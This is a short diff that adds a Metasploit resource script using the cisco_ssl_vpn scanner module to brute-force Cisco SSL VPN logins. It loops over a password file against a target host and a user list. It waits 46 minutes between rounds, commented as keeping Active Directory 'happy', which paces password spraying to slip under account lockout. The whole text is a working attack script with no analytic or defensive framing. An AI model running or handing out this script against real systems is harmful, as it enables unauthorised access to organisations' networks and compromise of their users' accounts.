@@ -1,0 +1,16 @@
+<ruby>
+run_single("spool vpn-brute-log.txt")
+run_single("use auxiliary/scanner/http/cisco_ssl_vpn")
+run_single("set GROUP $GROUPID")
+run_single("set RHOSTS $TARGET")
+run_single("set RPORT 443")
+run_single("set USER_FILE Users")
+run_single("set verbose true")
+File.open("owa-brute.txt", "r") do |file_handle|
+  file_handle.each_line do |pass|
+    run_single(%Q[set PASSWORD #{pass}])
+    run_single("exploit")
+    sleep 2760 #Sleep for 46 minutes to make AD happy
+  end
+end
+</ruby>
